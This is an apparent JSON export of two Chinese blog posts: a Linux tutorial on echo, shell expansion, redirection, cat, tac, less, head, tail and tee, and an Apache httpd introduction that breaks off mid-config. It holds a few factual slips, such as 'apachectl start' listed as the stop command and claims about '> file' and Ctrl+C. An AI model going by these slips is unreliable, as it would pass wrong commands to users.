[{"content":"迟来的第二篇！其实我早就写好了，忘记发了\n这一篇还是挺重要的，包括$符号、重定向等等，算是解决了之前看别人写的命令的很多疑惑\n第一篇看这里：Linux命令（文件管理篇） echo —— 在终端显示一行文本或变量 主要功能是将紧跟在它后面的字符串或变量的值输出到标准输出\n语法格式 echo [参数] \u0026lt;字符串\u0026gt; Shell的解析 echo在实际执行之前，Shell会先对命令行进行解析，处理各种扩展规则\n这使得echo的行为不仅取决于它的参数内容，还取决于这些参数是如何写的\n命令解析顺序 Shell 在执行echo命令之前，会按照以下顺序解析命令行内容：\n变量替换，例如$USER、$HOME等会被替换成当前环境中相应的值 命令替换，例如$(date) 或date会被替换为命令执行后的输出结果 路径通配符，如*.txt 引号的解析和空格的处理 关于$使用方法移步：[$符号的使用](#echo扩展：$ —— Shell中的特殊元字符)\n使用双引号 \u0026quot; \u0026quot; —— 弱引用 双引号内部的内容保留大部分字面意义，但允许进行变量和命令替换\necho \u0026#34;Hello $USER, today is $(date)\u0026#34; $USER被替换成当前用户名，$(date)被替换成当前系统时间，输出结果可能是：\nHello bob, today is Tue Jul 30 20:00:00 JST 2025 双引号还可以保留字符串中的空格，例如：\necho \u0026#34;Hello World\u0026#34; 会输出：\nHello World 使用单引号 \u0026rsquo; \u0026rsquo; —— 强引用 单引号内部的所有内容都按字面含义处理，禁止任何形式的变量和命令替换\necho \u0026#39;Hello $USER, today is $(date)\u0026#39; 输出结果为：\nHello $USER, today is $(date) 即完全照原样输出，不做任何解析\n不使用引号 不加引号的参数会被Shell正常解析，包括变量和命令替换，但有两个值得注意的特点：\n多个空格会被压缩为一个 如果参数中有特殊字符或空格，Shell会认为它们是分隔符或命令符号 echo Hello $USER 输出类似：\nHello bob 空格被压缩了，只显示一个空格\n常用参数 核心功能 参数 功能说明 -n 不在末尾输出自动的换行符 -e 启用对反斜杠转义字符的解释，例如，\\n会被解释为换行，\\t会被解释为制表符 -E 显式地禁用对反斜杠转义字符的解释（通常是默认行为） 使用示例 显示简单的文本字符串\necho \u0026#34;Hello, Linux World!\u0026#34; 使用转义字符进行格式化输出\necho -e \u0026#34;Files found:\\n\\t- /path/to/file1.txt\\n\\t- /path/to/file2.txt\u0026#34; 输出：\nFiles found: - /path/to/file1.txt - /path/to/file2.txt echo扩展：$ —— Shell中的特殊元字符 $符号本身并不是一个命令，而是Linux Shell中的一个特殊元字符\n它的核心功能是进行扩展，即将其后面的内容替换成别的值，例如变量的值或命令的执行结果\n变量引用 引用普通变量 name=\u0026#34;linux\u0026#34; echo $name 上面的命令将会输出linux\n引用环境变量 echo $HOME # 当前用户的主目录 echo $HOSTNAME # 当前主机名 echo $PATH # 可执行程序搜索路径，即/bin和/sbin echo $SHELL # 默认shell类型 echo $USER # 当前用户名 echo $UID # 当前用户ID 顺便提一嘴，查看环境变量有哪些可以使用printenv、env、set\n避免歧义 ${}的写法在变量名后紧跟其他字符时可避免歧义：\necho ${name}123 上面的命令将会输出linux123\n命令替换 使用$() echo $(date) 先执行date命令，再将其输出替换到echo\n使用反引号 echo `date` 推荐使用$()，因为可嵌套\n算术扩展 使用双重括号(())包裹表示算术表达式：\n$((表达式)) 可进行整数运算：\necho $((1+2)) 上面的命令将会输出输出3\n也可以定义变量：\nx=5 echo $((x*2)) 上面的命令将会输出10\n特殊变量 Shell内置有很多特殊变量，用$引用，一般在脚本里面使用，方便脚本编写：\n变量名 含义说明 示例值 / 用法 $0 当前脚本的名称 ./myscript.sh $1~$9 脚本的第1到第9个参数 $1是第1个参数 ${10} 第10个及以上的参数，必须使用大括号 ${10} $# 传递给脚本的参数个数 3 表示有三个参数 $@ 以独立字符串形式表示所有参数 \u0026quot;arg1\u0026quot; \u0026quot;arg2\u0026quot; \u0026quot;arg3\u0026quot; $* 以一个整体字符串形式表示所有参数 \u0026quot;arg1 arg2 arg3\u0026quot; $$ 当前Shell进程的PID 13542 $! 最近一次后台运行的进程PID 18321（如sleep 10 \u0026amp;后的进程号） $? 上一条命令的退出状态（0 表示成功，非 0 失败） 0表示成功，1表示失败 $- 当前Shell启动时使用的选项 如himBH表示启用了哪些选项 $_ 上一条命令中的最后一个参数 比如刚运行cp file1 file2，则为file2 字符串处理 $结合{}可进行多种扩展操作：\n默认值处理 表达式 含义 ${var:-word} 如果var未设置或为空，返回word ${var:=word} 如果var未设置或为空，返回word并将其赋值给var ${var:?message} 如果var未设置或为空，输出message到标准错误，并中止脚本 ${var:+word} 如果var设置了值，返回word，否则返回空 eg：\necho ${var:-default} var未定义或为空时输出default\n字符串长度 语法：\n${#变量名} 这是一种字符串长度计算语法，会计算变量名中字符串的字符数\neg：\nstr=\u0026#34;linux\u0026#34; echo ${#str} 上面的命令会输出5\n子串截取 语法：\n${变量名:起始位置:长度} ${变量名:起始位置} 起始位置0开始计数 若不指定长度，则截取到末尾 若起始位置为负数，从右往左数 eg：定义字符串str=\u0026quot;linuxsystem\u0026quot;\necho ${str:0:5} 输出linux，从位置0开始，截取5个字符\necho ${str:5} 输出system，从位置5开始截到末尾\n子串删除 语法 含义 ${变量%模式} 从变量值末尾开始，删除最短匹配的 模式 ${变量%%模式} 从变量值末尾开始，删除最长匹配的 模式 ${变量#模式} 从变量值开头开始，删除最短匹配的 模式 ${变量##模式} 从变量值开头开始，删除最长匹配的 模式 eg：\npath=\u0026#34;/home/user/file.txt\u0026#34; echo ${path%/*} ：输出/home/user echo ${path##*/} ：输出file.txt\ncat —— 连接文件并打印到标准输出 cat命令是Linux中一个非常基础且功能强大的文本文件处理工具\n它的名称是concatenate(连接)的缩写，其核心功能是将一个或多个文件的内容连接起来，并将其输出到标准输出(通常是终端屏幕)\n语法格式 cat [参数] \u0026lt;文件名1\u0026gt; \u0026lt;文件名2\u0026gt;... Linux标准输入输出与重定向 标准输入输出 在Linux中，命令运行时默认会关联三个数据流：\n标准输入 (stdin)：命令获取数据的默认来源，一般是键盘输入，文件描述符为0 标准输出 (stdout)：命令输出结果的默认目的地，一般是终端屏幕，文件描述符为1 标准错误 (stderr)：命令的错误信息输出的默认目的地，也是终端屏幕，文件描述符为2 例如执行cat file.txt，程序会从标准输入中读取文件内容并写到标准输出，因此屏幕上可以看到结果\n使用\u0026amp;+文件描述符，可以表示对应输入输出的位置，比如\u0026amp;1就是标准输出当前所在的位置，类似指针\n重定向操作符 重定向是指把命令的标准输入或标准输出指向到其他位置（如文件），常见用法包括：\n\u0026gt;：把命令的标准输出重定向到指定文件，如果文件存在，会覆盖原内容\necho \u0026#34;Hello\u0026#34; \u0026gt; test.txt 上面命令会把字符串写入test.txt，覆盖其原有内容\n我们还可以使用空的内容重定向文件，快速做到清除文件：\n\u0026gt; test.txt 经过我的测试，这个效果和cat \u0026gt; test.txt一样，执行之后要手动ctrl+c退出，不然输入的内容就写进去了\n\u0026gt;\u0026gt;：把命令的标准输出以追加方式重定向到指定文件，不会覆盖原内容\necho \u0026#34;World\u0026#34; \u0026gt;\u0026gt; test.txt 上面命令会把字符串追加到test.txt的末尾\n\u0026lt;：把标准输入重定向为某个文件内容\ncat \u0026lt; test.txt 上面命令会从test.txt读取数据作为标准输入并显示在屏幕，结果上等同于cat test.txt\n不过我们一般不这样使用，而是结合其他命令：\nsort \u0026lt; test.txt 上面命令会对test.txt内容排序后输出\n\u0026lt;\u0026lt;：启动多行输入模式（HereDocument）\ncat \u0026lt;\u0026lt; EOF 上面命令会把接下来的多行内容作为标准输入，直到遇到EOF标识符，这个标识符是自己定义的\n2\u0026gt;：把命令的标准错误流（stderr）重定向到指定文件，如果文件存在，会覆盖原内容\nls nofile.txt 2\u0026gt; error.log 上面命令会把ls的错误信息写入到error.log文件中，而不是显示在屏幕上\n2\u0026gt;\u0026gt;：把命令的标准错误流以追加方式重定向到指定文件，不会覆盖原内容\nls nofile.txt 2\u0026gt;\u0026gt; error.log 上面命令会把错误信息追加到error.log文件末尾\n\u0026amp;\u0026gt;：同时重定向标准输出和标准错误流到指定文件，覆盖原内容\nyourcommand \u0026amp;\u0026gt; log 上面命令会把命令执行的结果的标准输出和标准错误都写入到log文件\n2\u0026gt;\u0026amp;1：把标准错误重定向到标准输出的位置（合并到一起）\nyourcommand \u0026gt; log 2\u0026gt;\u0026amp;1 上面命令会把标准输出和标准错误都写入到log文件中\n上面我们提到的重定向都是针对当前的命令，如果想要对整个当前shell都生效，必须用exec重定向：\nexec \u0026amp;\u0026gt; log 这样之后在这个shell里的所有输出都会写进log，直到恢复或退出\n常用参数 参数 功能说明 -n 从1开始为所有输出行编号 -b 与-n类似，但只为非空行编号 -s 当遇到有连续两行以上的空白行，就代换为一行的空白行 -E 在每行结束处显示一个$符号 -T 将Tab制表符显示为^I -v 显示不可打印字符（除了换行符和 Tab） -e 等价于-vE：显示不可见字符，行尾加$ -A 等价于-vET：显示不可见字符，行尾加$，Tab制表符显示为^I 使用示例 同时查看并合并多个文件的内容\ncat file1.txt file2.txt cat会按照参数顺序，将file1.txt和file2.txt的内容连续地打印到屏幕上\n创建新文件\ncat \u0026gt; new_file.txt # 执行该命令后，光标会停留在下一行等待输入 # 输入想要的内容，例如： Hello, world.This is a new file. # 按下 Ctrl + C 组合键来保存并退出 这里cat因为没有指定文件名，所以从键盘（标准输入）读取内容，而\u0026gt;将这些内容重定向到了new_file.txt文件中\n也可以使用\u0026lt;\u0026lt;指定标识符：\ncat \u0026gt; file.txt \u0026lt;\u0026lt; END # 输入想要的内容，例如： Hello World END # file.txt的内容会变成： Hello World 合并多个文件为一个新文件\ncat part1.log part2.log \u0026gt; full.log 向文件末尾追加内容\ncat \u0026gt;\u0026gt; file.txt # 输入内容 # 按下 Ctrl + C 结束 也可以使用\u0026lt;\u0026lt;指定标识符：\ncat \u0026gt;\u0026gt; file.txt \u0026lt;\u0026lt; END 显示文件内容并附带行号\ncat -n file tac —— 逆序连接并打印文件内容 tac的名称非常直观，就是cat命令的反写，核心功能也与cat正好相反：cat从第一行开始正序显示文件内容，而tac则从最后一行开始逆序显示文件内容\n语法格式 tac [参数] \u0026lt;文件名\u0026gt; tac的基本执行流程 读取整个文件的内容 tac通常是先读取完整个文件（或标准输入）到内存中（或者内部缓冲区） 按分隔符拆分内容 默认分隔符是换行符\\n，也可以用-s指定其他分隔符 如果使用了-r，分隔符则是一个正则表达式，用于匹配多种分隔符 tac会把文件内容按照分隔符切分成若干“块” 倒序输出这些块 按块的顺序从最后一个块开始输出到第一个块 在每两个块之间加上分隔符，默认情况下，分隔符附加在块内容的后面（块后） 如果加了-b，分隔符放在块内容前 输出拼接成最终倒序结果 输出每个块以及分隔符，形成完整倒序后的文本 常用参数 不同于cat，tac的参数非常少\n参数 功能说明 -b 在每行内容之前附加分隔符（默认为换行符） -r 将分隔符当作正则表达式来处理 -s \u0026lt;字符串\u0026gt; 使用指定的字符串作为记录分隔符，而不是默认的换行符 使用示例 tac命令的几个用法都有些难以理解，这里我们举几个具体的例子\n假设我们有一个numbers.txt文件，内容如下：\nOne,Two Three 执行tac命令，块分割是One,Two和Three，按照块2 - 分隔符 - 块1的倒序，输出结果将会是：\nThree \\n One,Two ↓ Three One,Two 如果使用-b参数，让分隔符输出在块之前，按照分隔符 - 块2 - 块1的顺序，输出结果将会是：\n\\nThree One,Two ↓ ←注意这一行是\\n造成的 ThreeOne,Two 如果使用tac -s , ，即使用,作为分隔符，块分割将会变成One和Two\\nThree\\n（注意最后一行末尾也是有换行符的），按照块2 - 分隔符 - 块1的倒序，输出结果将会是：\nTwo\\nThree\\n,One ↓ Two Three ,One 如果使用-b参数，让分隔符输出在块之前，按照分隔符 - 块2 - 块1的顺序，输出结果将会是：\n,Two\\nThree\\nOne ↓ ,Two Three One 查找文件中最后一次出现某个模式的行\ntac log | grep -m 1 \u0026#34;ERROR\u0026#34; 执行流程：\ntac log: 首先将整个日志文件按行逆序，最新的日志现在在最上面 |: 将逆序后的内容通过管道传递给grep grep -m 1 \u0026quot;ERROR\u0026quot;: 在逆序的输出中，查找第一个匹配“ERROR”的行，因为文件已经逆序，所以这个“第一个”匹配的行实际上是原始文件中的最后一个，-m 1确保grep在找到后立即停止 less \u0026amp; more —— 分页显示文本文件内容 less和more 是Linux中用于分页查看长文本文件的命令\n当一个文件的内容超过一屏时，使用cat会瞬间刷满屏幕导致无法看清前面的内容，此时就应该使用less或more\n语法格式 使用方式相同：\nmore/less [参数] \u0026lt;文件名\u0026gt; 从more到less的演进 more more是Unix系统中最早的分页查看工具，意思是“更多”，表示“继续显示更多内容”\n它允许用户分屏浏览文本文件或命令输出，默认一页一页地显示内容\n但它的功能简单，交互有限，只能向下翻页（按空格键或回车键），不支持向上滚动回看已经滚过的内容\nless less是对more的改进版本，它其实是开玩笑地取名，含义是“less is more”（少即是多）\n改进点：\n支持双向滚动（上下翻页都能用） 支持搜索、跳转、更丰富的交互 处理大文件更高效，打开大文件时速度更快，因为它不会一次性将整个文件读入内存 在几乎所有的现代Linux发行版中，less已经完全取代more成为默认和推荐的分页器\n交互模式下的常用按键 当我们使用less/more打开一个文件后，就进入了它的交互模式，可以使用按键进行操作\nmore 按键 功能 空格键 / f 向下翻一页 b 向上翻一页**（部分版本支持）** Enter键 向下滚动一行 /pattern 向下搜索字符串pattern less 按键 功能 空格键 / f 向下翻一页 b 向上翻一页 Enter键 / j / ↓ 向下滚动一行 k / ↑ 向上滚动一行 G 直接跳转到文件末尾 g 直接跳转到文件开头 d 向下滚动半页 u 向上滚动半页 /pattern 向下搜索字符串pattern ?pattern 向上搜索字符串pattern n 跳转到下一个搜索匹配项 N 跳转到上一个搜索匹配项 q 退出less h 显示帮助菜单，列出所有可用按键 常用参数 more 参数 说明 -d 显示“按空格继续，q退出”的提示信息 -c 每次显示前清屏 -s 合并连续多个空行为一行 -num 设置每次显示的行数（如-20表示20行） -f 统计行数时，连同换行符一起计算 less 参数 说明 -N 显示行号 -S 不自动换行，横向超出屏幕的内容用→标示 -X 退出时不清屏，保留显示内容 -z N 指定滚动的页面行数N -i 搜索时忽略大小写 -I 搜索时忽略大小写，且搜索模式固定 -p pattern 启动后直接跳转到第一个匹配pattern的地方 -F 如果内容只有一屏，直接退出 less -R 显示颜色转义序列（保留颜色） 学习过vim编辑器的肯定会发现less和vim操作有许多相似之处，也的确如此 —— 他们都是vi编辑器的后辈\n什么？你还没有学过vim？点击即送免费课堂！ \u0026ndash;\u0026gt; vim完全使用教程 使用示例 查看一个长文件\nless/more log 分页查看命令输出\nls -alh /etc | less/more 查看文件并显示行号（less独有）\nless -N log 设置每页显示的行数（more独有）\nmore -20 log 在文件中进行搜索\nless log 操作流程：\n使用less打开文件后，直接按/键 输入想搜索的关键词（例如ERROR），再按回车 less会高亮显示第一个匹配项，可以按n键跳转到下一个匹配项，按N键跳转到上一个 head —— 从文件头部查看内容 与cat不同，其核心功能是显示指定文件开头的部分内容\n语法格式 head [参数] \u0026lt;文件名\u0026gt; 常用参数 核心功能 参数 功能说明 -n \u0026lt;行数\u0026gt;\n或 -\u0026lt;行数\u0026gt; 显示文件的开头N行 -c \u0026lt;字节数\u0026gt; 按字节数显示文件的开头内容，而不是按行数 控制与输出 参数 功能说明 -q 当处理多个文件时，不显示每个文件名前的头部标签 -v 总是显示文件名头部标签 使用示例 查看文件的开头10行\nhead file 在不指定行数时，默认显示文件的开头10行\n查看文件的开头5行\nhead -n 5 /etc/hosts 也可以使用下面的简写形式，效果完全一样：\nhead -5 /etc/hosts 查看多个文件的头部标签\nhead -n 3 file1.txt file2.txt 当head处理多个文件时，它会默认在每个文件的内容前显示文件名作为标题（如==\u0026gt; file1.txt \u0026lt;==），方便区分\ntail —— 从文件尾部查看内容 与head命令正好相反，tail的核心功能是显示指定文件末尾的部分内容\n语法格式 tail [参数] \u0026lt;文件名\u0026gt; Linux日志监控 tail命令之所以重要，是因为它完美地契合了Linux系统管理的常见需求——日志监控\n在Linux系统中，应用程序和系统服务的日志通常是不断增长的文本文件，最新的内容总是在文件末尾 tail命令最强大的功能之一就是能够实时地跟踪一个文件的末尾 当新内容被追加到文件中时（例如，一条新的日志记录被写入），tail可以立即将其显示在终端上，这使其成为系统管理员和开发者监控程序状态和排查问题的必备工具 Linux管道与命令组合 管道|的作用是将前一个命令的标准输出直接作为后一个命令的标准输入 错误信息默认不会被传递，如果要传递错误输出，可用2\u0026gt;\u0026amp;1合并，比如命令1 2\u0026gt;\u0026amp;1 | 命令2 head和tail命令经常在管道中组合使用，以精确地提取出文件的中间部分 常用参数 核心功能 参数 功能说明 -n \u0026lt;行数\u0026gt;\n或 -\u0026lt;行数\u0026gt; N是正整数：显示文件的末尾N行\nN是带+的数字：从文件第N行开始输出到文件结尾（不能使用-\u0026lt;行数\u0026gt;形式） -f **持续监控并显示文件的追加内容\n**当文件增长时，新内容会实时显示出来。按Ctrl+C退出 -F **与-f类似，但更强大\n**当被监控的文件被重命名或删除后重新创建时，-F能够智能地重新打开新文件并继续监控 -c \u0026lt;字节数\u0026gt; 按字节数显示文件的末尾内容，而不是按行数 控制与输出 参数 功能说明 -q 当处理多个文件时，不显示每个文件名前的头部标签 -v 总是显示文件名头部标签 使用示例 查看文件的最后10行\ntail file.txt 在不指定行数时，默认显示文件的末尾10行\n从第10行开始查看文件到结尾\ntail -n +10 file.txt 查看error.log文件的最后100行\ntail -n 100 error.log 也可以使用下面的简写形式，效果完全一样：\ntail -100 error.log 持续监控Nginx访问日志文件\ntail -f /var/log/nginx/access.log 每当有新的访问请求被记录下来，该条日志就会立即显示在终端上，按Ctrl+C可以停止监控\n查看一个日志文件的第101行到110行\nhead -n 110 log | tail -n 10 head -n 110 large_file.log 先取出文件的前110行内容 | (管道符) 将这110行内容作为输入，传递给下一个命令 tail -n 10 接收到这110行内容，并从中取出最后的10行 最终，屏幕上显示的就是原始文件的第101行到第110行 tee —— 从标准输入读取并同时写入到标准输出和文件 tee的名称来源于水管工程中的T型三通管，功能也与之类似：\n它从标准输入读取数据，然后将其一分为二，一份输出到标准输出，另一份输出到一个或多个文件中\n语法格式 tee命令几乎总是与管道符|结合使用，收前一个命令的输出作为自己的输入\n\u0026lt;某个命令\u0026gt; | tee [参数] \u0026lt;文件名\u0026gt; Linux管道中的“三通管” 可以把tee的处理想象一个水管的T型三通接头：\n┌────\u0026gt; stdout（屏幕） stdin ───┤ └────\u0026gt; 文件 数据流（就像水流）通过管道|流入tee命令，而tee命令就像这个三通接头，它将数据流一分为二：\n一股水流继续沿着管道向下流，流向标准输出（您的屏幕） 另一股水流从T字的侧口流出，被导入到一个或多个文件中 这个特性使得我们可以在不中断管道流的情况下，既能实时查看命令输出，又能将其保存到文件中\n常用参数 参数 功能说明 -a 追加模式，将内容追加到指定文件的末尾，而不是覆盖原有内容 -i 忽略中断信号（Ctrl+C），在长时间运行的管道任务中避免意外中断 使用示例 查看ls -l命令输出并同时保存到文件\nls -l | tee file.txt 追加内容到日志文件\necho \u0026#34;this is a message\u0026#34; | tee -a log 结合sudo向需要root权限的文件写入内容\necho \u0026#34;127.0.0.1 myapp.local\u0026#34; | sudo tee -a /etc/hosts 执行流程：\n不能直接使用sudo echo \u0026quot;...\u0026quot; \u0026gt;\u0026gt; /etc/hosts，因为输出重定向\u0026gt;\u0026gt;是由当前的普通用户Shell执行的，它没有权限写入/etc/hosts 而在这个命令中，管道|将echo的输出传递给tee命令 tee命令是在sudo的权限提升作用下运行的，可以将从管道接收到的内容写入到/etc/hosts中 将输出保存到多个文件\ndate | tee date_log1.txt date_log2.txt ","date":"2025-08-27T14:12:37+08:00","image":"http://picture.928330.xyz/typora/fcc033dfd187d8eb0d29169a672d75ce.jpg","permalink":"https://blog.928330.xyz/p/linux%E5%91%BD%E4%BB%A4%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E4%B8%8E%E6%9F%A5%E7%9C%8B%E7%AF%87/","title":"Linux命令（文件写入与查看篇）"},{"content":"时隔一个月，又来学服务器了\n其实是因为美亚杯做到了apache相关内容啦\n猜你喜欢：Nginx入门 何为Apache Apache HTTP Server（简称Apache，或httpd，使用时为Apache2）是Apache软件基金会的一个开源网页服务器项目\n自1995年发布以来，它凭借其稳定性、强大的功能、丰富的模块和跨平台特性，一度成为全球使用最广泛的Web服务器\n它的核心优势在于其高度模块化的设计，几乎所有功能，从SSL加密(mod_ssl)、URL重写(mod_rewrite)到与各种后端语言（如PHP的mod_php）的集成，都是通过模块实现的，这使得Apache具有极高的灵活性和可扩展性\nNginx vs Apache 在之前，我们介绍了如何使用nginx：Nginx入门 那么它和apache之间究竟有什么区别？\n核心架构 这是两者最根本的区别\nApache 采用基于进程或线程的模型，它有多种工作模式（MPM），如prefork（每个请求一个进程）和worker/event（每个请求一个线程）\n这种模型对于每个连接都会消耗一定的系统资源，在高并发下内存占用较高\nNginx 采用事件驱动的异步非阻塞架构\n它用极少数的工作进程就能处理成千上万的并发连接，资源消耗极低，特别擅长应对高并发和处理静态资源\n功能与生态 Apache 历史悠久，功能模块极其丰富，生态系统成熟\n对于动态内容（如PHP），其mod_php模块直接在Apache进程内执行，处理流程简单直接\n它的.htaccess文件提供了强大的目录级配置能力，让开发者无需修改主配置就能调整行为\nNginx 核心功能是高性能的HTTP服务和反向代理\n它的模块化设计虽然也很强大，但通常更侧重于性能和网络层面\n它不支持.htaccess，所有配置集中管理，性能更高，也更符合现代运维理念\n总的来说：\nApache稳定、功能全面，对动态内容支持极佳\nNginx轻量、高效，在高并发、静态资源和反向代理场景下更好用\n在现代架构中两者常常协同工作，用Nginx处理静态资源和代理，后端再由Apache处理复杂的动态业务逻辑\nApache的主要用法 Web服务器 直接向客户端提供静态（HTML, CSS, 图片）和动态（PHP, Perl, Python）内容的服务\nApache对动态内容的原生支持非常出色，是许多传统Web应用（如WordPress, Joomla）的首选平台\n反向代理服务器 通过mod_proxy模块，Apache可以作为客户端和后端应用服务器之间的中间人，实现请求转发、负载均衡，并隐藏后端服务细节\n负载均衡器 配合mod_proxy_balancer模块，Apache可以将接收到的请求分发到后端的多台服务器上，从而提高网站的可用性和处理能力\n访问控制与URL重写 强大的.htaccess和mod_rewrite功能，使其在URL美化（伪静态）、访问权限控制等方面表现非常灵活\n目录结构 和nginx一样，不同发行版和安装方式的apache的目录结构有差异，只不过apache的差异更为显著\n与nginx不同，apache官方一般只提供二进制编译安装的文件，.deb文件更多是交给第三方打包\n源码编译安装 名称为apache2\n自定义程度最高，所有文件通常都集中在指定的前缀下（默认为/usr/local/apache2）\n/ # 根目录 └── usr/ └── local/ └── apache2/ ├── bin/ # 可执行文件 (httpd, apachectl, ab等) ├── build/ # 编译时使用的脚本和工具 ├── cgi-bin/ # CGI脚本示例目录 ├── conf/ # 配置文件目录 │ ├── httpd.conf # 主配置文件 │ ├── extra/ # 额外的配置文件 (vhosts.conf, ssl.conf等) │ └── mime.types ├── htdocs/ # 默认 Web 根目录 │ └── index.html ├── icons/ # Apache默认图标目录 ├── include/ # C/C++头文件，用于开发模块 ├── logs/ # 日志文件目录 (access_log, error_log) └── modules/ # 动态加载的模块 (.so 文件) Debian/Ubuntu官方仓库 (通过apt安装) 名称为apache2\n目录结构遵循Debian的策略，将配置文件、模块和站点配置分拆到不同目录，便于管理\n/ # 根目录 ├── etc/ │ └── apache2/ │ ├── apache2.conf # 主配置文件，主要包含全局设置 │ ├── conf-available/ # 可用的配置片段目录 │ ├── conf-enabled/ # 已启用的配置片段 (符号链接) │ ├── mods-available/ # 可用的模块配置文件 (.load, .conf) │ ├── mods-enabled/ # 已启用的模块 (符号链接) │ ├── sites-available/ # 可用的虚拟主机配置文件 │ │ └── 000-default.conf │ └── sites-enabled/ # 已启用的虚拟主机配置 (符号链接) │ └── 000-default.conf -\u0026gt; ../sites-available/000-default.conf │ ├── usr/ │ ├── sbin/ │ │ └── apache2ctl # Apache 控制脚本 │ └── lib/ │ └── apache2/ │ └── modules/ # 模块二进制文件 (.so) │ ├── var/ │ ├── www/ │ │ └── html/ # 默认 Web 根目录 │ │ └── index.html │ └── log/ │ └── apache2/ # 日志文件目录 │ ├── access.log │ └── error.log └── lib/ └── systemd/ └── system/ └── apache2.service # Systemd 服务单元 CentOS/RHEL官方仓库 (通过yum/dnf安装) 名称为httpd\n目录结构与Debian系有所不同，但同样遵循系统规范\n关于systemd位置的问题，可以查看：nginx入门 — systemd / # 根目录 ├── etc/ │ └── httpd/ │ ├── conf/ │ │ └── httpd.conf # 主配置文件 │ ├── conf.d/ # 子配置目录，所有 .conf 文件会被自动加载 │ │ └── welcome.conf │ └── conf.modules.d/ # 模块加载配置目录 │ ├── usr/ │ ├── sbin/ │ │ └── httpd # 主程序二进制文件 │ └── lib64/ │ └── httpd/ │ └── modules/ # 模块二进制文件 (.so) │ ├── var/ │ ├── www/ │ │ ├── html/ # 默认 Web 根目录 │ │ └── cgi-bin/ │ └── log/ │ └── httpd/ # 日志文件目录 │ ├── access_log │ └── error_log │ └── usr/ └── lib/ └── systemd/ └── system/ └── httpd.service # Systemd 服务单元 Docker镜像（官方 httpd） docker镜像目录结构取决于镜像的制作者，没有自己的专属结构\n以官方的httpd镜像为例，它是基于Debian或Alpine Linux构建的，其内部结构通常类似于源码编译安装\n/ # 根目录 └── usr/ └── local/ └── apache2/ ├── bin/ ├── cgi-bin/ ├── conf/ # 配置文件目录 (可挂载) ├── htdocs/ # 默认 Web 根目录 (可挂载) ├── icons/ ├── include/ ├── logs/ # 日志文件目录 (符号链接) └── modules/ 唯一要注意的是日志文件：\nDocker容器的httpd的日志输出到标准输出(stdout)和标准错误(stderr)，而不是写入文件\n执行如下命令：\ngrep -E \u0026#34;ErrorLog|CustomLog\u0026#34; /usr/local/apache2/conf/httpd.conf 输出中会有这样两行：\nErrorLog /proc/self/fd/2 CustomLog /proc/self/fd/1 common 也就是说，访问日志和错误日志不会被写入文件，而是重定向到标准输入和标准错误\n我们可以通过docker的命令来查看它们：\ndocker logs \u0026lt;容器ID\u0026gt; 常用命令 使用systemctl管理Apache 适用于通过系统包管理器安装的Apache服务，比如apache2或httpd\n下文以apache2为例\n启动 systemctl start apache2 停止 systemctl stop apache2 重启 systemctl restart apache2 重新加载配置 不会中断现有连接\nsystemctl reload apache2 查看状态 systemctl status apache2 # 或 httpd 使用apachectl（或 apache2ctl） 这是Apache自带的控制工具，适合调试、配置检查\n它其实就是对httpd可执行程序的一个封装，方便管理Apache\n启动 apachectl start 停止 apachectl start 重新加载配置 不会中断现有连接\napachectl graceful 查看版本 apachectl -v 检查配置文件语法 apachectl -t Debian/Ubuntu专属工具：a2en* / a2dis* 这些工具主要管理站点配置和模块，对/etc/apache2/下的文件进行操作\n启用：在*-available → *-enabled创建符号链接 禁用：删除对应链接 操作之后要记得重启（reload / graceful）\n管理站点（虚拟主机） —— site /etc/apache2/sites-enabled/site.conf -\u0026gt; /etc/apache2/sites-available/site.conf\n启用站点 a2ensite site.conf site.conf是要启用的虚拟主机配置文件，它定义了一个网站在Apache上的访问方式，包括域名、网站目录、日志路径等\n禁用站点 a2dissite site.conf 管理模块 —— mod /etc/apache2/mods-enabled/module_name.load -\u0026gt; /etc/apache2/mods-available/module_name.load\n/etc/apache2/mods-enabled/module_name.os -\u0026gt; /etc/apache2/mods-available/module_name.os\n部分模块会有配置文件：\n/etc/apache2/mods-enabled/module_name.conf -\u0026gt; /etc/apache2/mods-available/module_name.conf\n启用模块 a2enmod module_name module_name是要启动的模块名称，不用带后缀名\n禁用模块 a2dismod module_name 管理配置文件 —— conf /etc/apache2/conf-enabled/config_name.conf -\u0026gt; /etc/apache2/conf-available/config_name.conf\n启用配置 a2enconf config_name config_name是要加载的配置文件名称，不用带后缀名\n禁用配置 a2disconf file.conf 主配置文件 (httpd.conf) 主配置文件在各个不同系统的路径不同：\n在RHEL/CentOS上通常是/etc/httpd/conf/httpd.conf\n在Debian/Ubuntu上是/etc/apache2/apache2.conf\n它定义了服务器的全局行为、加载的模块、默认设置以及如何包含其他配置文件\n不同系统配置文件使用的语法也差不多，以下是一个典型的httpd.conf（RHEL/CentOS风格）文件的结构：\n# -------------------- 全局配置 -------------------- ServerRoot \u0026#34;/etc/httpd\u0026#34; Listen 80 User apache Group apache PidFile run/httpd.pid Timeout 60 KeepAlive On MaxKeepAliveRequests 100 KeepAliveTimeout 5 # -------------------- 模块加载与条件判断 -------------------- # 直接加载关键模块 LoadModule mpm_event_module modules/mod_mpm_event.so LoadModule authz_core_module modules/mod_authz_core.so # 包含其他模块配置文件 Include conf.modules.d/*.conf # -------------------- 主服务器配置 -------------------- ServerAdmin root@localhost # ServerName www.example.com:80 # 使用\u0026lt;IfModule\u0026gt;确保模块存在时才应用指令 \u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.html index.php \u0026lt;/IfModule\u0026gt; DocumentRoot \u0026#34;/var/www/html\u0026#34; # -------------------- 目录与文件访问控制 -------------------- # 限URL需要认证 \u0026lt;Location /admin\u0026gt; AuthType Basic AuthName \u0026#34;Admin Area\u0026#34; AuthUserFile /etc/httpd/.htpasswd Require valid-user \u0026lt;/Location\u0026gt; # 默认禁止访问所有文件系统 \u0026lt;Directory /\u0026gt; AllowOverride none Require all denied \u0026lt;/Directory\u0026gt; # 开放 Web 根目录的访问权限 \u0026lt;Directory \u0026#34;/var/www/html\u0026#34;\u0026gt; Options Indexes FollowSymLinks AllowOverride None Require all granted \u0026lt;/Directory\u0026gt; # 使用\u0026lt;Files\u0026gt;块保护敏感文件 \u0026lt;Files \u0026#34;.ht*\u0026#34;\u0026gt; Require all denied \u0026lt;/Files\u0026gt; # -------------------- 日志配置 -------------------- ErrorLog \u0026#34;logs/error_log\u0026#34; LogLevel warn LogFormat \u0026#34;%h %l %u %t \\\u0026#34;%r\\\u0026#34; %\u0026gt;s %b \\\u0026#34;%{Referer}i\\\u0026#34; 